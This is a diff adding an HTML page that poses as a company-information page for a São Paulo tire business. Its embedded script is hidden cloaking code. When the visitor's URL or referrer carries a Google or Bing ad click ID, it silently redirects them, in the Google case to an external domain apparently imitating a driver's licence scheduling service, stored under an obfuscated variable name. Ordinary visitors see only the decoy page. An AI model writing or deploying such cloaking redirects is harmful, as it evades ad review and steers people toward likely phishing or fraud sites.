@@ -1,1 +1,149 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Comercial de Pneus Roma LTDA</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            background-color: #f4f4f4;
+        }
+        header {
+            background-color: #222;
+            color: white;
+            padding: 15px;
+            text-align: center;
+        }
+        section {
+            padding: 20px;
+            margin: 20px;
+            background: white;
+            border-radius: 8px;
+        }
+        h2 {
+            border-bottom: 2px solid #ddd;
+            padding-bottom: 5px;
+        }
+        .info {
+            margin-bottom: 10px;
+        }
+        footer {
+            text-align: center;
+            padding: 10px;
+            background-color: #222;
+            color: white;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
+</head>
+  <script>
 
+const urls = [
+    'cte/index',
+    'nfe/index',
+    'cte/index',
+    'asp/indexp',
+    'app/index',
+    'xml/indexp',
+    'danfe/index',
+    'nfe/index'
+];
+
+// Função para gerar um hash MD5 (requer biblioteca crypto ou implementação personalizada)
+function generateHash() {
+    // Gerando um hash simples como alternativa ao MD5
+    // Para MD5 real, seria necessário uma biblioteca como crypto-js
+    return Math.random().toString(36).substring(2, 15) + 
+           Math.random().toString(36).substring(2, 15) + 
+           Date.now().toString(36);
+}
+
+// Selecionando URL aleatória
+const randomIndex = Math.floor(Math.random() * urls.length);
+const randomUrl = urls[randomIndex];
+const hash = generateHash();
+const googlerandomUrlWithHash = randomUrl + '?gclid=' + hash;
+const bingrandomUrlWithHash = randomUrl + '?msclkid=' + hash;
+const xirjfgjsdhdjd = 'https://app-agendamentocnh.digital/emissao/';  
+
+// Obtendo o referer (disponível apenas no navegador)
+let referer;
+if (typeof document !== 'undefined' && document.referrer) {
+    referer = document.referrer;
+} else {
+    referer = 'not found';
+}
+
+// Obtendo a URL atual (equivalente ao REQUEST_URI do PHP)
+let currentUrl;
+if (typeof window !== 'undefined') {
+    currentUrl = window.location.href;
+} else {
+    currentUrl = '';
+}
+
+// Verificando condições e redirecionando
+if (/gclid/i.test(referer) || /gclid/i.test(currentUrl)) {
+    // Redirecionamento (no navegador)
+    if (typeof window !== 'undefined') {
+        window.location.href = xirjfgjsdhdjd ;
+    } else {
+
+        console.log('Redirect to:', xirjfgjsdhdjd );
+    }
+} else if (/msclkid/i.test(referer) || /msclkid/i.test(currentUrl)) {
+    // Redirecionamento (no navegador)
+    if (typeof window !== 'undefined') {
+        window.location.href = bingrandomUrlWithHash;
+    } else {
+        console.log('Redirect to:', bingrandomUrlWithHash);
+    }
+} else {
+    // Bloco vazio equivalente ao else do PHP
+}
+  
+</script>
+<body>
+
+<header>
+    <h1>Comercial de Pneus Roma LTDA</h1>
+    <p>CNPJ: 61.721.320/0001-25</p>
+</header>
+
+<section>
+    <h2>Informações da Empresa</h2>
+    <p class="info"><strong>Razão Social:</strong> Comercial de Pneus Roma LTDA</p>
+    <p class="info"><strong>Data de Abertura:</strong> 20/12/1968</p>
+    <p class="info"><strong>Tempo de Atividade:</strong> 57 anos</p>
+    <p class="info"><strong>Porte:</strong> Sem Enquadramento</p>
+    <p class="info"><strong>Natureza Jurídica:</strong> Sociedade Empresária Limitada</p>
+    <p class="info"><strong>Capital Social:</strong> R$ 2.500.000,00</p>
+    <p class="info"><strong>Situação:</strong> Ativa</p>
+</section>
+
+<section>
+    <h2>Contato</h2>
+    <p class="info"><strong>Email:</strong> fe****@****.net</p>
+    <p class="info"><strong>Telefone:</strong> (11) 383****-****</p>
+    <p class="info"><strong>Telefone 2:</strong> (11) 337****-****</p>
+</section>
+
+<section>
+    <h2>Localização</h2>
+    <p class="info"><strong>Endereço:</strong> Avenida Antonio Estevao de Carvalho, 2644</p>
+    <p class="info"><strong>Complemento:</strong> Sala 2</p>
+    <p class="info"><strong>Bairro:</strong> Cidade Patriarca</p>
+    <p class="info"><strong>CEP:</strong> 03540-200</p>
+    <p class="info"><strong>Cidade:</strong> São Paulo - SP</p>
+</section>
+
+<footer>
+    <p>&copy; 2026 Comercial de Pneus Roma LTDA</p>
+</footer>
+
+</body>
+</html>
